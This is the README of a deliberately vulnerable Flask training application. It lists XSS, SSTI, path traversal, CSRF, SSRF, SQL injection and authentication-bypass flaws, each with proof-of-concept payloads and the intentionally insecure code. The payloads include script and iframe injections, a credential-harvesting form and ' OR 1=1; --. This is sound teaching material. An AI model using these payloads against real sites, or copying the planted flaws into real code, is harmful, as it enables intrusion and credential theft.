# Description:
FVA Flask Vulnerable Application was developed for the purpose of learning 

# Installation
##### Clone and install the application
```BASH
git clone https://github.com/FIR-UIII/FVA.git
cd FVA
python3 -m venv {name}
source bin/activate
pip install -r requirements.txt
```
##### Install PostgreSQL
Please see the documentation: https://www.postgresql.org/docs/current/tutorial-install.html

# TODO:
* сделать заглушки в случае невалидных логина или пароля или необходиомсти аутентификации
* csrf добавить подключение к БД psql
* перенести в env основные конфигурационные настройки

# Vulnerabilities 
## XSS
Exploit/PoC:
```html
1. GET injection: http://{URL}/xss?param=<script>alert(1)</script>
2. HTML img injection: <img src=https://stackoverflow.com/ onerror=alert(1)>
3. JS  injection: <script>alert(document.domain)</script>
4. HTML tag injection: <a href="javascript:alert(document.domain);">click here</a>
5. Iframe injection: <iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
6. Iframe injection:<iframe src="http://httpforever.com/></iframe>
7. Form injection:
<form name="login" action="http://ip: port/">
 	<label for="login">login: </label>
 	<input type="text" name="login" required>
 	<br>
 	<label for="password">password: </label>
 	<input type="password" name="password" required>
 	<br>
 	<input type="submit" value="Login!">
 </form>
8. Service worker injection:
<script>
window.addEventListener('load', function() {
    var sw = "/sw.js";
    navigator.serviceWorker.register(sw, {scope: '/'})
       .then(function(registration) {
            console.log('Service Worker registered successfully');
        })
       .catch(function(err) {
            console.error('Service Worker registration failed:', err);
        });
});
</script>
```

Vulnerable code:
```
# modules/xss.py
user_input = request.args.get('param') #<-- точка ввода через query параметры xss reflected + SSTI  
return render_template('xss.html', user_input=user_input) #<-- небезопасный вывод пользователю данных без санитизации
data = request.form['user_input'] #<-- точка пользовательского ввода без валидации xss stored
```

## Authentication bypass
Exploit/PoC:
```
1. Go to root page "/" (logout from the current session if nessesary)
2. Open DevTools / Application / Cookies:
3. Create new with name:'user_id', value:'any_value'
4. Refresh page and profit
```

Vulnerable code:
```
# modules/require_authentication.py
cookie = request.cookies.get('user_id') #<--значение cookie не проверяется
```

## Path traversal
Exploit/PoC:
```
1. Open view-source http://localhost:8888/path_travers
2. Observe the path: <img src="/path_travers_img/?img=/static/scripting.png" alt="what_is_that" width="100" height="100"></p>
3. Try:
/../<your_local_file>
/README.md
/static/scripting.png
```
Vulnerable code:
```
# modules/path_travers.py
image_path = f"{root_folder()}{file_path}" # --> dangerous command root_folder() and get user {file_path} input without validation
```

## SSTI 
Exploit/PoC:
```
Go to: http://localhost:8888/ssti
Try payload:
?param={{(9*9)}}
?param={{%20config.items()%20}}
```

Vulnerable code:
```
# modules/ssti.py
user_input = request.args.get('param', 'Введите данные в query "?param="') #<-- точка ввода через query параметры xss reflected + SSTI
return render_template_string(template) #<-- небезопасный вывод пользователю данных без санитизации
</b>'''+user_input+'''</pre> #<-- небезопасный вывод пользователю данных без санитизации
```

## XSS via Service worker
Exploit/PoC:
```
1. Go to /upload  
2. Use payload /sw.js: `setInterval(function(){console.log("U been h@cked");}, 5000);`
3. Refresh page
```

Vulnerable code:
```
# templates/upload.html
<script>
      if (navigator.serviceWorker) {
        navigator.serviceWorker.register('/static/sw.js').then(function(registration) {
          console.log('Service Worker registered:', registration.scope);
        }).catch(function(error) {
          console.error('Service Worker registration failed:', error);
        });
      }
    </script>
# main.py
file.save(os.path.join(FVA.static_folder, filename)) #<-- user input without proper validation
```

## CSRF
Exploit/PoC:
```
1. Create phishing web server `python -m http.server`
2. Host payload /hacker_csrf.html
3. Provide to victim phishing URL (user action: click)
4. Check passwords

OR
1. Create phishing URL link http://{URL}/ssrf?url=http://localhost:8888/xss
2. Provide to victim phishing URL (user action: click)
3. Check passwords
```

Vulnerable code:
```
# modules/csrf.py
@csrf_bp.route('/change_password', methods=['POST', 'GET']) #<-- critical actions mist be exucuted via POST request
if request.method == 'GET': #<-- critical actions mist be exucuted via POST request
new_password = str(request.args.get('new_password')) #<-- no info from fronend that this is user actions
```

## SSRF
Exploit/PoC:
Vulnerable code:
GET request: 
http://localhost:8888/ssrf?url=http://localhost:8888/xss

POST request: 
curl -X POST -d "url=http://localhost:8888/xss" http://localhost:8888/ssrf


# SQl injection
Exploit/PoC:
Vulnerable code:
brew services start postgresql
psgl postgres
python init_db.py from modules.init_db import create_database
=# \dt
=# SELECT * FROM users;

injection 
login: ' OR 1=1; --
password: any

# command_injection
Exploit/PoC:
Vulnerable code:

/go to command_injection
change cookie to admin > base64

## Security misconfiguration
#### CORS
Exploit/PoC:
Vulnerable code:

python -m http.server 8000
devtools > console:
fetch('http://localhost:8888/api/users')
  .then(response => response.text())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));

  
